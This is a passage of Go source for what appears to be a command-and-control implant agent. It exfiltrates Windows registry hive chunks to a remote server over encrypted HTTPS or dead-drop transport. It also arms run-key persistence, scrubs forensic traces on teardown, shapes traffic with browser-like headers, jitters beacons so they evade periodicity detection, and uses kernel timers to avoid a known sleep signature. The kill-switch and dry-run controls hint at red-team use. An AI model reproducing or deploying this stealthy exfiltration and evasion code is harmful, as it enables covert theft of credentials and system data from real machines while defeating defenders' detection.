	resumeAt, _ := a.extractProgress.get(jobID)
	if resumeAt > total {
		resumeAt = total
	}
	if resumeAt > 0 {
		a.logger.Printf("Task extract: job=%s resuming chunk loop at %d/%d (spooled=%v)", jobID, resumeAt, total, useSpool)
	}

	pfxBytes := a.prefix[:]
	aadOut := []byte(a.cfg.AgentID + ":out")
	aadIn := []byte(a.cfg.AgentID + ":in")

	for i := resumeAt; i < total; i++ {
		select {
		case <-ctx.Done():
			a.teardownStateRemoval = true
			return 0
		default:
		}

		if useSpool && acked[i] {
			// The server already confirmed this seq; the spool deleted it.
			a.extractProgress.set(jobID, i+1)
			continue
		}

		hive := imageHive
		var rawBytes []byte
		if useSpool {
			data, err := a.spool.Get(jobID, i)
			if err != nil {
				a.logger.Printf("spool get %s[%d]: %v; will resume on re-dispatch", jobID, i, err)
				a.extractProgress.set(jobID, i)
				return 0
			}
			rawBytes = data
			if hive == "" {
				if p, err := a.spool.Progress(jobID); err == nil {
					hive = p.Hive
				}
			}
		} else {
			rawBytes = raws[i]
			hive = chunks[i].HiveName
		}

		resultPayload := registrywin.BuildResultPayload(jobID, hive, i, total, rawBytes)

		resultMsg := message.Make("result", a.cfg.AgentID, jobID, resultPayload, float64(time.Now().UnixNano())/1e9)
		resultJSON, err := json.Marshal(resultMsg)
		if err != nil {
			a.logger.Printf("marshal result: %v; will resume on re-dispatch", err)
			a.extractProgress.set(jobID, i)
			return 0
		}

		frame, err := wire.Build(resultJSON, a.sessionKey[:], pfxBytes, aadOut, a.sendSeq, wire.DirectionClientToServer)
		if err != nil {
			a.logger.Printf("build result frame: %v; will resume on re-dispatch", err)
			a.extractProgress.set(jobID, i)
			return 0
		}
		a.sendSeq++

		resp, err := a.postFrame(ctx, frame, a.sendSeq-1)
		if err != nil {
			a.logger.Printf("result send failed (chunk %d); will resume on re-dispatch: %v", i, err)
			a.extractProgress.set(jobID, i)
			return 0
		}

		_, seq, _, err := wire.Parse(resp, a.sessionKey[:], pfxBytes, aadIn, wire.DirectionServerToClient)
		if err != nil {
			a.logger.Printf("parse ack (chunk %d); will resume on re-dispatch: %v", i, err)
			a.extractProgress.set(jobID, i)
			return 0
		}
		a.rw.Record(seq)

		audit.SecureZeroBytes(rawBytes)
		if !useSpool {
			raws[i] = nil
		}

		// Chunk i is sent and acked: a re-dispatch resumes at i+1.
		a.extractProgress.set(jobID, i+1)

		if i < total-1 {
			if !a.sleep(ctx, a.chunkDelay()) {
				a.teardownStateRemoval = true
				return 0
			}
		}
	}

	a.markProcessed(jobID)
	a.logger.Printf("Task complete: sent %d chunks (job %s)", total, jobID)
	return 0
}

// handleKill processes a kill message.
// Returns 0 for "kill", 2 for "kill_switch", -1 if not accepted.
func (a *Agent) handleKill(msg map[string]any) int {
	payload, _ := msg["payload"].(string)
	epochFloat, _ := msg["epoch"].(float64)
	sigHex, _ := msg["sig"].(string)
	agentID, _ := msg["agent_id"].(string)

	epoch := uint64(epochFloat)

	if agentID != a.cfg.AgentID {
		a.logger.Printf("kill rejected: wrong agent_id %q", agentID)
		return -1
	}

	sigBytes, err := hex.DecodeString(sigHex)
	if err != nil || len(sigBytes) != ed25519.SignatureSize {
		a.logger.Printf("kill rejected: invalid signature")
		return -1
	}

	if !cryptokeys.KillVerify(a.signPub, epoch, a.cfg.AgentID, payload, sigBytes) {
		a.logger.Printf("kill rejected: signature verification failed")
		return -1
	}

	if epoch <= a.lastKillEpoch {
		a.logger.Printf("kill rejected: epoch %d <= last accepted %d", epoch, a.lastKillEpoch)
		return -1
	}

	a.lastKillEpoch = epoch
	a.state.LastAcceptedEpoch = epoch
	if err := a.state.Save(); err != nil {
		a.logger.Printf("warning: could not persist epoch: %v", err)
	} else {
		// The kill is durably recorded; teardown may remove the replay floor.
		a.teardownStateRemoval = true
	}

	// Accepted kill (rejected kills returned -1 above): disarm persistence,
	// wipe the spool, and optionally scrub — after KillVerify and the epoch
	// check, never before.
	a.finalCleanup(a.teardownStateRemoval)

	if payload == "kill_switch" {
		a.logger.Printf("Kill switch accepted (epoch=%d)", epoch)
		return 2
	}

	a.logger.Printf("Kill accepted (epoch=%d)", epoch)
	return 0
}

// jobStatus is one server-reported chunk reassembly status inside a beacon
// payload. Missing is truncated at maxServerMissing.
type jobStatus struct {
	JobID    string `json:"job_id"`
	Hive     string `json:"hive"`
	Total    int    `json:"total"`
	Received int    `json:"received"`
	Missing  []int  `json:"missing"`
	Complete bool   `json:"complete"`
}

// maxServerMissing mirrors server.MaxJobProgressMissing: at that length the
// missing list is truncated and the complement of missing is unknown.
const maxServerMissing = 128

// updateBeaconInterval applies beacon timing, job-status recovery, and pacing
// updates from the single server beacon payload parser. It returns true when
// the run should stop after delivery (exit_after_delivery satisfied); the
// caller returns 0 through the normal path so defers run.
func (a *Agent) updateBeaconInterval(ctx context.Context, msg map[string]any) bool {
	payload, _ := msg["payload"].(string)
	if payload == "" {
		return false
	}
	var cfg struct {
		Interval int         `json:"interval"`
		Jitter   int         `json:"jitter"`
		Jobs     []jobStatus `json:"jobs"`
	}
	if err := json.Unmarshal([]byte(payload), &cfg); err != nil {
		return false
	}
	if cfg.Interval > 0 {
		a.beaconInterval = cfg.Interval
	}
	if cfg.Jitter >= 0 {
		a.beaconJitter = cfg.Jitter
	}
	for _, st := range cfg.Jobs {
		a.applyJobStatus(ctx, st)
	}
	if a.shouldExitAfterDelivery() {
		a.logger.Printf("exit_after_delivery: all extract jobs server-confirmed complete")
		a.teardownStateRemoval = true
		a.finalCleanup(true)
		return true
	}
	return false
}

// applyJobStatus reconciles one server job status against the durable spool:
// missing seqs are resent from the spool and seqs the server has (and whose
// status is fully known) are pruned. A truncated missing list is treated
// conservatively: the tail is unknown, so nothing is deleted.
func (a *Agent) applyJobStatus(ctx context.Context, st jobStatus) {
	if st.JobID == "" {
		return
	}
	if st.Complete {
		if a.spool != nil {
			if err := a.spool.Complete(st.JobID); err != nil {
				a.logger.Printf("spool complete %s failed: %v", st.JobID, err)
			}
		}
		a.markProcessed(st.JobID)
		a.serverCompleted.add(st.JobID)
		a.logger.Printf("Server confirmed job %s complete", st.JobID)
		return
	}
	if a.spool == nil {
		return
	}
	prog, err := a.spool.Progress(st.JobID)
	if err != nil {
		return
	}
	for _, seq := range st.Missing {
		if seq < 0 || seq >= prog.Total {
			continue
		}
		if !a.sendSpooledResult(ctx, st.JobID, st.Hive, seq, prog.Total) {
			a.logger.Printf("resend of %s[%d] failed; will retry on next status", st.JobID, seq)
		}
	}
	// Conservative prune: never delete when the server truncated the missing
	// list (len == maxServerMissing), because the unlisted tail is unknown.
	if len(st.Missing) >= maxServerMissing {
		return
	}
	missing := make(map[int]bool, len(st.Missing))
	for _, s := range st.Missing {
		missing[s] = true
	}
	// Never ack seqs beyond the server-reported total: if the totals disagree,
	// the tail is not covered by the missing list and must be kept.
	limit := prog.Total
	if st.Total > 0 && st.Total < limit {
		limit = st.Total
	}
	acked := make([]int, 0, limit)
	for seq := 0; seq < limit; seq++ {
		if !missing[seq] {
			acked = append(acked, seq)
		}
	}
	if len(acked) > 0 {
		if err := a.spool.Ack(st.JobID, acked); err != nil {
			a.logger.Printf("spool ack %s failed: %v", st.JobID, err)
		}
	}
}

// sendSpooledResult resends one durable chunk for jobID as a result frame. It
// returns true when the server acked the frame. It never extracts; a missing
// chunk is left for the next extract re-dispatch.
func (a *Agent) sendSpooledResult(ctx context.Context, jobID, hive string, seq, total int) bool {
	if a.spool == nil {
		return false
	}
	rawBytes, err := a.spool.Get(jobID, seq)
	if err != nil {
		return false
	}
	defer audit.SecureZeroBytes(rawBytes)
	if hive == "" {
		if p, err := a.spool.Progress(jobID); err == nil {
			hive = p.Hive
		}
	}
	resultPayload := registrywin.BuildResultPayload(jobID, hive, seq, total, rawBytes)
	resultMsg := message.Make("result", a.cfg.AgentID, jobID, resultPayload, float64(time.Now().UnixNano())/1e9)
	resultJSON, err := json.Marshal(resultMsg)
	if err != nil {
		a.logger.Printf("marshal resend result: %v", err)
		return false
	}
	frame, err := wire.Build(resultJSON, a.sessionKey[:], a.prefix[:], []byte(a.cfg.AgentID+":out"), a.sendSeq, wire.DirectionClientToServer)
	if err != nil {
		a.logger.Printf("build resend frame: %v", err)
		return false
	}
	a.sendSeq++
	resp, err := a.postFrame(ctx, frame, a.sendSeq-1)
	if err != nil {
		a.logger.Printf("resend send failed (%s[%d]): %v", jobID, seq, err)
		return false
	}
	if _, s, ok, err := wire.Parse(resp, a.sessionKey[:], a.prefix[:], []byte(a.cfg.AgentID+":in"), wire.DirectionServerToClient); err == nil && ok {
		a.rw.Record(s)
		a.recvSeq++
	}
	return true
}

// shouldExitAfterDelivery reports whether exit_after_delivery is satisfied:
// enabled, at least one extract job server-confirmed complete (so noop/sleep
// sessions never trigger), and no incomplete spooled jobs remain.
func (a *Agent) shouldExitAfterDelivery() bool {
	if !a.cfg.ExitAfterDelivery {
		return false
	}
	if a.serverCompleted.len() == 0 {
		return false
	}
	if a.spool != nil {
		jobs, err := a.spool.Jobs()
		if err != nil {
			return false
		}
		return len(jobs) == 0
	}
	return a.extractProgress.empty()
}

// spoolCoversJob reports whether every non-acked seq for the job is present in
// the spool (so the durable image is authoritative and complete).
func (a *Agent) spoolCoversJob(jobID string, p spool.Progress, acked map[int]bool) bool {
	for seq := 0; seq < p.Total; seq++ {
		if acked[seq] {
			continue
		}
		if _, err := a.spool.Get(jobID, seq); err != nil {
			return false
		}
	}
	return true
}

// armPersistence arms the configured persistence mode. It is a no-op unless
// persistence is enabled and real_mode is set. Arm is idempotent, and the
// manager is created once per process so repeated extract dispatches cannot
// spawn duplicate watchdogs.
func (a *Agent) armPersistence() error {
	mode := a.cfg.Persistence.Mode
	if mode == "" || mode == "none" || !a.cfg.RealMode {
		return nil
	}
	if a.persistence == nil {
		exe, err := os.Executable()
		if err != nil {
			return fmt.Errorf("resolve executable: %w", err)
		}
		factory := a.persistFactory
		if factory == nil {
			factory = persist.New
		}
		m, err := factory(persist.Config{
			Mode:       persist.Mode(mode),
			AgentID:    a.cfg.AgentID,
			ExePath:    exe,
			Args:       []string{"--resume"},
			RunKeyName: a.cfg.Persistence.RunKeyName,
			// No time bound: the armed persistence self-removes on delivery
			// completion or an accepted kill (Disarm).
			TTL:    0,
			Logger: a.logger,
		})
		if err != nil {
			return err
		}
		a.persistence = m
	}
	return a.persistence.Arm()
}

// finalCleanup is the single teardown for every terminal path: disarm
// persistence, wipe the durable spool, optionally scrub forensic traces, and
// (when removeState is set) delete the signed-kill replay-floor state file.
// It is idempotent across the deferred and explicit call sites. It must never
// run for a rejected kill or inside the watchdog child.
func (a *Agent) finalCleanup(removeState bool) {
	a.cleanupOnce.Do(func() {
		if a.persistence != nil {
			if err := a.persistence.Disarm(); err != nil {
				a.logger.Printf("persistence disarm failed: %v", err)
			}
		}
		if a.spool != nil {
			if err := a.spool.Wipe(); err != nil {
				a.logger.Printf("spool wipe failed: %v", err)
			}
		}
		if a.cfg.AntiForensic.ScrubTraces {
			exePath := ""
			if exe, err := os.Executable(); err == nil {
				exePath = exe
			}
			rep := antiforensic.Scrub(antiforensic.Config{
				Enabled: true,
				ExePath: exePath,
				Logger:  a.logger,
			})
			if len(rep.Removed) > 0 || len(rep.Errors) > 0 {
				a.logger.Printf("antiforensic scrub: %d removed, %d skipped, %d errors", len(rep.Removed), len(rep.Skipped), len(rep.Errors))
			}
		}
		if removeState && a.state != nil {
			if err := a.state.Remove(); err != nil {
				a.logger.Printf("state file removal failed: %v", err)
			}
		}
	})
}

// postFrame sends one envelope frame over the configured transport (HTTPS POST
// or dead-drop) and returns the response frame bytes. seq is the frame's
// sequence number, used for dead-drop blob correlation.
func (a *Agent) postFrame(ctx context.Context, frame []byte, seq uint32) ([]byte, error) {
	if a.postFrameHook != nil {
		return a.postFrameHook(ctx, frame, seq)
	}
	if a.dryRun {
		a.logger.Printf("[DRY-RUN] Would send %d bytes (no egress)", len(frame))
		// Determine key/prefix for synthetic response. At hello time the
		// forward-secret sessionKey is still zero — the server encrypts the
		// hello-ack under the handshake key. Mirror that here so hello can
		// Parse the synthetic ack.
		var key [32]byte
		var prefix [3]byte
		isZero := true
		for _, b := range a.sessionKey {
			if b != 0 {
				isZero = false
				break
			}
		}
		if isZero {
			hsKey, err := cryptokeys.HandshakeKey(a.ephPriv, a.serverPub, a.salt, a.cfg.AgentID)
			if err == nil {
				hsPrefix, _ := cryptokeys.FramePrefix(hsKey, "v2")
				key = hsKey
				prefix = hsPrefix
			} else {
				key = a.sessionKey
				prefix = a.prefix
			}
		} else {
			key = a.sessionKey
			prefix = a.prefix
		}
		pfxBytes := prefix[:]
		aadIn := []byte(a.cfg.AgentID + ":in")
		var resp []byte
		if isZero {
			// Hello-ack synthetic: need server_eph_pub so hello can derive session key.
			_, dummyPub, _ := cryptokeys.GenEphemeral()
			payload := fmt.Sprintf(`{"interval":%d,"jitter":%d,"server_eph_pub":%q}`,
				a.beaconInterval, a.beaconJitter, hex.EncodeToString(dummyPub[:]))
			beacon := message.Make("beacon", a.cfg.AgentID, "hello-ack", payload, float64(time.Now().UnixNano())/1e9)
			raw, _ := json.Marshal(beacon)
			resp, _ = wire.Build(raw, key[:], pfxBytes, aadIn, a.recvSeq, wire.DirectionServerToClient)
		} else {
			msg := message.Make("beacon", a.cfg.AgentID, "beacon-0", "", float64(time.Now().UnixNano())/1e9)
			msgJSON, _ := json.Marshal(msg)
			resp, _ = wire.Build(msgJSON, key[:], pfxBytes, aadIn, a.recvSeq, wire.DirectionServerToClient)
		}
		a.recvSeq++
		return resp, nil
	}

	// Dead-drop transport: exchange the frame as an opaque blob (LOTS).
	if a.dropClient != nil {
		resp, err := a.dropClient.Exchange(ctx, frame, seq)
		if err != nil {
			return nil, err
		}
		return resp, nil
	}

	req, err := http.NewRequestWithContext(ctx, "POST", a.cfg.ServerURL, bytes.NewReader(frame))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	if a.cfg.Shaping.Enabled && a.shaper != nil {
		// Shape browser-plausible headers and path on top of the required
		// Content-Type. The URL host and scheme are never modified; the
		// profile path is sanitized (never "/admin").
		req.URL.Path = a.shaper.Path()
		req.URL.RawPath = ""
		req.Header.Set("User-Agent", a.shaper.UserAgent())
		for k, v := range a.shaper.Headers() {
			req.Header.Set(k, v)
		}
	} else {
		ua := a.cfg.UserAgent
		if ua == "" {
			ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
		}
		req.Header.Set("User-Agent", ua)
	}

	resp, err := a.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	limitedBody := http.MaxBytesReader(nil, resp.Body, MaxResponseBytes)
	body, err := io.ReadAll(limitedBody)
	if err != nil {
		var maxErr *http.MaxBytesError
		if errors.As(err, &maxErr) {
			return nil, fmt.Errorf("response body exceeds %d byte limit: %w", MaxResponseBytes, err)
		}
		return nil, fmt.Errorf("read response body: %w", err)
	}
	return body, nil
}

// retryWithBackoff retries with exponential backoff (30→60→120 cap 300s).
func (a *Agent) retryWithBackoff(ctx context.Context, fn func() error) bool {
	backoffs := []time.Duration{30 * time.Second, 60 * time.Second, 120 * time.Second, 300 * time.Second}
	for _, delay := range backoffs {
		a.logger.Printf("Retrying in %v...", delay)
		select {
		case <-ctx.Done():
			return false
		case <-time.After(delay):
		}
		if err := fn(); err != nil {
			a.logger.Printf("Retry failed: %v", err)
			continue
		}
		return true
	}
	return false
}

func (a *Agent) beaconDelay() time.Duration {
	if a.beaconJitter <= 0 {
		return time.Duration(a.beaconInterval) * time.Second
	}
	// Gaussian jitter around the interval: std = jitter/3 keeps ~99.7% of
	// draws within [interval-jitter, interval+jitter]; clamp to avoid
	// degenerate short beacons. Perfect periodicity is the detectable signal;
	// a right-skewed spread weakens it.
	base := float64(a.beaconInterval)
	std := float64(a.beaconJitter) / 3.0
	delta := a.jitterRNG.NormFloat64() * std
	d := base + delta
	if d < float64(a.beaconInterval)/2 {
		d = float64(a.beaconInterval) / 2
	}
	if d > float64(a.beaconInterval)+2*float64(a.beaconJitter) {
		d = float64(a.beaconInterval) + 2*float64(a.beaconJitter)
	}
	return time.Duration(d * float64(time.Second))
}

func (a *Agent) chunkDelay() time.Duration {
	minMs, maxMs := a.cfg.MinDelayMs, a.cfg.MaxDelayMs
	var base time.Duration
	if minMs <= 0 && maxMs <= 0 {
		base = 0
	} else if maxMs <= minMs {
		base = time.Duration(minMs) * time.Millisecond
	} else {
		base = time.Duration(minMs+a.jitterRNG.Intn(maxMs-minMs)) * time.Millisecond
	}
	if a.cfg.Shaping.Enabled && a.cfg.Shaping.UploadJitterMs > 0 {
		return netshape.Jitter(base, time.Duration(a.cfg.Shaping.UploadJitterMs)*time.Millisecond, a.jitterRNG)
	}
	return base
}

// sleep blocks for d, honoring ctx cancellation. With transport.sleep_mode
// "timer", Windows builds use a kernel waitable timer instead of the runtime
// sleep path (no NtDelayExecution pattern).
func (a *Agent) sleep(ctx context.Context, d time.Duration) bool {
	if a.cfg.Transport.SleepMode == "timer" {
		return timerwait.Sleep(ctx, d)
	}
	select {
	case <-ctx.Done():
		return false
	case <-time.After(d):
		return true
	}
}
